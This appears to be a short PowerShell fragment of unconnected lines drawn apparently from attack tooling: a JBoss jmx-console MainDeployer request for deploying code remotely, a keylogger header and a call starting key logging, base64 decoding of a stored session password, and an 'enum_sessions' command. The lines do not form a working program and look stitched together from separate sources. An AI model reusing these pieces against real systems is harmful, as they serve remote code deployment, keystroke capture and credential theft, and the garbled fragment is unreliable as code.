$url = 'https://' + $HostName + '/script'
$jmx = '/jmx-console/HtmlAdaptor?action=invokeOp'
$deploy = 'name=jboss.system:service=MainDeployer&methodIndex=19&arg0='
$header = "[=== $LastWindowTitle - $TimeStamp ===]"
$decoded = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Session.Password))
$listener.startkeyLog()
$command = 'enum_sessions'
